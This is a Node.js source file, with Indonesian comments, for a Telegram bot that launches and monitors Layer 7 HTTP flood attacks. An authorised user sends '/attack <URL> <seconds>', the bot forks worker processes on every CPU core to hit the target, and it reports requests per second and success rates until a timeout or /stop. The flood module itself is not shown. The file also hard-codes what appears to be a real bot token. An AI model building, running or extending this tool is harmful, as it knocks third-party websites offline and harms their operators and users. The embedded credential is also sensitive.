const TelegramBot = require('node-telegram-bot-api');
const { fork } = require('child_process');
const os = require('os');

const token = '8962044822:AAGNjh-qyQQsFY6SitarRFMzr5DepQOCNmY';

const bot = new TelegramBot(token, { polling: true });

// --- ID PENGGUNA YANG DIIZINKAN ---
// Tambahkan ID numerik Telegram Anda di sini untuk keamanan.
// Anda bisa menambahkan lebih dari satu ID, pisahkan dengan koma.
const AUTHORIZED_USER_IDS = [8710323660];

let isAttackRunning = false;
let workers = [];
let attackTimeout;
let displayInterval;
let lastStatusText = '';

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeMessage = `
Selamat datang di Bot Serangan! 🚀

Bot ini dapat melakukan beberapa jenis serangan Layer 7. Gunakan dengan bijak.

Klik tombol di bawah untuk melihat cara menggunakan perintah serangan.
    `;

    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '⚡ Attack', callback_data: 'show_attack_usage' }]
            ]
        }
    };
    bot.sendMessage(chatId, welcomeMessage, opts);
});

bot.onText(/\/attack(?: (.+) (\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const targetUrl = match[1];
    const duration = parseInt(match[2], 10);

    if (!AUTHORIZED_USER_IDS.includes(msg.from.id)) {
        bot.sendMessage(chatId, '❌ Anda tidak diizinkan menggunakan perintah ini.');
        return;
    }

    if (!targetUrl || !duration) {
        const usageMessage = "Format perintah salah.\n\n*Contoh Penggunaan:*\n`/attack https://example.com 120`";
        bot.sendMessage(chatId, usageMessage, { parse_mode: 'Markdown' });
        return;
    }

    if (isAttackRunning) {
        bot.sendMessage(chatId, '❌ Serangan lain sedang berjalan. Harap tunggu hingga selesai.');
        return;
    }

    try {
        new URL(targetUrl);
    } catch (e) {
        bot.sendMessage(chatId, '❌ URL target tidak valid.');
        return;
    }

    if (isNaN(duration) || duration <= 0) {
        bot.sendMessage(chatId, '❌ Durasi harus berupa angka positif.');
        return;
    }

    isAttackRunning = true;
    const sentMessage = await bot.sendMessage(chatId, '🚀 Mempersiapkan serangan...');
    const statusMessageId = sentMessage.message_id;

    const combinedStats = {
        total: 0,
        success: 0,
        failed: 0,
        phases: {},
        startTime: Date.now()
    };

    const numCPUs = os.cpus().length; // Gunakan semua CPU yang tersedia (2 di Railway)

    for (let i = 0; i < numCPUs; i++) {
        const worker = fork('./modules/main.js');
        worker.send({ targetUrl, duration });
        worker.on('message', (message) => {
            if (message.type === 'stats') {
                combinedStats.total += message.data.total;
                combinedStats.success += message.data.success;
                combinedStats.failed += message.data.failed;
                combinedStats.phases[worker.pid] = message.data.phase;
            }
        });
        workers.push(worker);
    }

    displayInterval = setInterval(() => {
        const elapsedSeconds = Math.floor((Date.now() - combinedStats.startTime) / 1000);
        const rps = elapsedSeconds > 0 ? (combinedStats.total / elapsedSeconds).toFixed(0) : 0;
        const rate = combinedStats.total > 0 ? (combinedStats.success / combinedStats.total * 100).toFixed(2) : '0.00';
        const activePhases = [...new Set(Object.values(combinedStats.phases))].join(', ');

        const statusText = `🔥 *Serangan Berlangsung* 🔥
-----------------------------------
🎯 *Target:* \`${targetUrl}\`
⏱️ *Waktu Berjalan:* ${elapsedSeconds} / ${duration} detik
-----------------------------------
*Mode Aktif:* ${activePhases || 'Initializing...'}
*Requests/detik:* ~${rps}
*Total Requests:* ${combinedStats.total}
*Sukses:* ${combinedStats.success}
*Gagal:* ${combinedStats.failed}
*Tingkat Sukses:* ${rate}%`;

        if (statusText !== lastStatusText) {
            bot.editMessageText(statusText, {
                chat_id: chatId,
                message_id: statusMessageId,
                parse_mode: 'Markdown'
            }).catch(() => {}); // Abaikan error jika pesan tidak berubah
            lastStatusText = statusText;
        }
    }, 4000); // Update setiap 1 detik untuk feedback yang lebih responsif

    // Atur timeout untuk menghentikan semua worker setelah durasi yang ditentukan
    attackTimeout = setTimeout(() => {
        clearInterval(displayInterval);
        const finalRate = (combinedStats.total > 0 ? (combinedStats.success / combinedStats.total * 100) : 0).toFixed(2);
        const finalStatusText = `✅ *Serangan Selesai* ✅
-----------------------------------
🎯 *Target:* \`${targetUrl}\`
⏱️ *Total Durasi:* ${duration} detik
-----------------------------------
*Total Requests:* ${combinedStats.total}
*Tingkat Sukses:* ${finalRate}%`;
        bot.editMessageText(finalStatusText, { chat_id: chatId, message_id: statusMessageId, parse_mode: 'Markdown' }).catch(() => {});
        workers.forEach(worker => worker.kill());
        workers = [];
        isAttackRunning = false;
    }, (duration + 2) * 1000); // Beri buffer 2 detik untuk laporan terakhir
});

bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;

    if (!AUTHORIZED_USER_IDS.includes(msg.from.id)) {
        bot.sendMessage(chatId, '❌ Anda tidak diizinkan menggunakan perintah ini.');
        return;
    }

    if (isAttackRunning) {
        clearTimeout(attackTimeout);
        clearInterval(displayInterval);
        workers.forEach(worker => worker.kill());
        workers = [];
        isAttackRunning = false;
        bot.sendMessage(chatId, '🛑 Serangan telah dihentikan secara manual.');
    } else {
        bot.sendMessage(chatId, 'ℹ️ Tidak ada serangan yang sedang berjalan.');
    }
});

bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;

    if (data === 'show_attack_usage') {
        const usageMessage = "Untuk memulai serangan, gunakan format:\n`/attack <URL> <Durasi Detik>`\n\n*Contoh:*\n`/attack https://example.com 120`";
        bot.sendMessage(msg.chat.id, usageMessage, { parse_mode: 'Markdown' });
    }
});

console.log('Telegram bot is listening for commands...');
